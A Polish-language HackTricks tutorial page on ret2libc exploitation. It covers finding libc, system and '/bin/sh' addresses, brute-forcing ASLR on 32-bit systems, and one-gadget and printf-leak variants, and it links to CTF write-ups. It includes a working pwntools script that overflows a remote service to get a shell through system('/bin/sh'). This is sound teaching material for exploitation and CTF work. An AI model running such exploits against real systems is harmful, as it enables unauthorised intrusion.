# Ret2lib

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Podstawowe informacje**

Istotą **Ret2Libc** jest przekierowanie przepływu wykonania podatnego programu do funkcji w bibliotece współdzielonej (np. **system**, **execve**, **strcpy**) zamiast wykonywania kodu shell dostarczonego przez atakującego na stosie. Atakujący tworzy ładunek, który modyfikuje adres powrotu na stosie, aby wskazywał na pożądaną funkcję biblioteczną, jednocześnie zapewniając, że wszelkie konieczne argumenty są poprawnie ustawione zgodnie z konwencją wywołania.

### **Przykładowe kroki (uproszczone)**

* Uzyskaj adres funkcji do wywołania (np. system) i polecenie do wywołania (np. /bin/sh)
* Wygeneruj łańcuch ROP, aby przekazać pierwszy argument wskazujący na ciąg poleceń oraz przepływ wykonania do funkcji

## Znajdowanie adresów

* Zakładając, że używana jest `libc` z bieżącej maszyny, można znaleźć, gdzie zostanie załadowana w pamięci za pomocą:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Jeśli chcesz sprawdzić, czy ASLR zmienia adres libc, możesz to zrobić:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Znając używaną bibliotekę libc, można również znaleźć przesunięcie do funkcji `system` za pomocą:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Znając używaną bibliotekę libc, można również znaleźć przesunięcie do funkcji łańcucha `/bin/sh` za pomocą:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Korzystanie z gdb-peda / GEF

Znając używaną bibliotekę libc, można również użyć Peda lub GEF, aby uzyskać adres funkcji **system**, funkcji **exit** oraz ciągu znaków **`/bin/sh`**:
```bash
p system
p exit
find "/bin/sh"
```
### Korzystanie z /proc/\<PID>/maps

Jeśli proces tworzy **dzieci** za każdym razem, gdy z nim rozmawiasz (serwer sieciowy), spróbuj **odczytać** ten plik (prawdopodobnie będziesz musiał być rootem).

Tutaj możesz znaleźć **dokładnie, gdzie jest załadowany libc** wewnątrz procesu i **gdzie będzie załadowany** dla każdego dziecka procesu.

![](<../../../.gitbook/assets/image (850).png>)

W tym przypadku jest załadowany pod adresem **0xb75dc000** (Będzie to adres bazowy libc)

## Nieznany libc

Może być możliwe, że **nie znasz libc, które jest ładowane przez binarny plik** (ponieważ może znajdować się na serwerze, do którego nie masz dostępu). W takim przypadku możesz wykorzystać podatność do **wycieku pewnych adresów i znalezienia, który libc** jest używany:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

A szablon pwntools do tego znajdziesz tutaj:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Znajomość libc z 2 przesunięciami

Sprawdź stronę [https://libc.blukat.me/](https://libc.blukat.me/) i użyj **kilku adresów** funkcji wewnątrz libc, aby dowiedzieć się, która **wersja jest używana**.

## Omijanie ASLR w 32 bitach

Te ataki brute-force są **przydatne tylko dla systemów 32-bitowych**.

* Jeśli exploit jest lokalny, możesz spróbować bruteforce'ować adres bazowy libc (przydatne dla systemów 32-bitowych):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Jeśli atakujesz zdalny serwer, możesz spróbować **przeprowadzić atak siłowy na adres funkcji `usleep` z biblioteki `libc`**, przekazując jako argument 10 (na przykład). Jeśli w pewnym momencie **serwer potrzebuje dodatkowych 10 sekund na odpowiedź**, oznacza to, że znalazłeś adres tej funkcji.

## One Gadget

Wykonaj powłokę, skacząc do **jednego** określonego **adresu** w bibliotece `libc`:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## Przykład kodu x86 Ret2lib

W tym przykładzie atak siłowy ASLR jest zintegrowany w kodzie, a podatny plik binarny znajduje się na zdalnym serwerze:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Przykład kodu x64 Ret2lib

Sprawdź przykład z:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Przykład ARM64 Ret2lib

W przypadku ARM64 instrukcja ret skacze tam, gdzie wskazuje rejestr x30, a nie tam, gdzie wskazuje rejestr stosu. Jest to trochę bardziej skomplikowane.

Ponadto w ARM64 instrukcja wykonuje to, co ma wykonać (nie można skakać w środek instrukcji i przekształcać ich w nowe).

Sprawdź przykład z:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (lub puts)

To pozwala na **wyciek informacji z procesu** poprzez wywołanie `printf`/`puts` z określonymi danymi umieszczonymi jako argument. Na przykład umieszczenie adresu `puts` w GOT podczas wywołania `puts` spowoduje **wyciek adresu `puts` w pamięci**.

## Ret2printf

Oznacza to w zasadzie nadużycie **Ret2lib w celu przekształcenia go w podatność na łańcuchy formatujące `printf`**, korzystając z `ret2lib` do wywołania printf z wartościami do jej wykorzystania (brzmi bezużytecznie, ale jest to możliwe):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Inne Przykłady i odnośniki

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, mając wyciek do adresu funkcji w libc, korzystając z jednego gadżetu
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bity, ASLR włączone, ale brak PIE, pierwszym krokiem jest przepełnienie aż do bajtu 0x00 canary, a następnie wywołanie puts i wyciek. Z canary tworzony jest gadżet ROP do wywołania puts w celu wycieku adresu puts z GOT, a następnie gadżet ROP do wywołania `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bity, ASLR włączone, brak canary, przepełnienie stosu w funkcji głównej z funkcji potomnej. Gadżet ROP do wywołania puts w celu wycieku adresu puts z GOT, a następnie wywołanie jednego gadżetu.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bity, brak pie, brak canary, brak relro, nx. Używa funkcji write do wycieku adresu write (libc) i wywołuje jeden gadżet.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Używa łańcucha formatującego do wycieku canary ze stosu i przepełnienia buforu do wywołania systemu (jest w GOT) z adresem `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bity, brak relro, brak canary, nx, pie. Nadużywa złego indeksowania do wycieku adresów libc i sterty ze stosu. Nadużywa przepełnienie buforu do wykonania ret2lib wywołującego `system('/bin/sh')` (adres sterty jest potrzebny do ominięcia sprawdzenia).
